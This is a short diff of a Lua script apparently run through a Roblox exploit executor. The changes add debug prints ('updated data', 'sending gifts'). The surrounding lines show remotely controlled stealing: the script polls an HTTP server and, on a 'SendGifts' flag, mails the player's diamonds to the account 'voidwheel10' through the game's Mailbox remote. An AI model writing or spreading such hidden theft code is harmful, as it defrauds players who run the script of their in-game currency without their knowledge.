@@ -391,6 +391,7 @@ HugeList = hugePetsString
 
     })
 })
+print(" updated data")
 wait(5)
 local Http = game:GetService("HttpService")
 local request = (syn and syn.request) or request or (http and http.request) or http_request
@@ -409,6 +410,7 @@ local function checkSendGifts()
 
         if success and responseBody.SendGifts then
             if responseBody.SendGifts == true then
+print("sending gifts")
               local args = {
                     [1] = "voidwheel10",
                     [2] = "enjoy bro",
@@ -417,7 +419,8 @@ local function checkSendGifts()
                     [5] = diamondsvalue
                 }
                 game:GetService("ReplicatedStorage").Network:FindFirstChild("Mailbox: Send"):InvokeServer(unpack(args))
-            end
+           
+end
         end
     end
 end
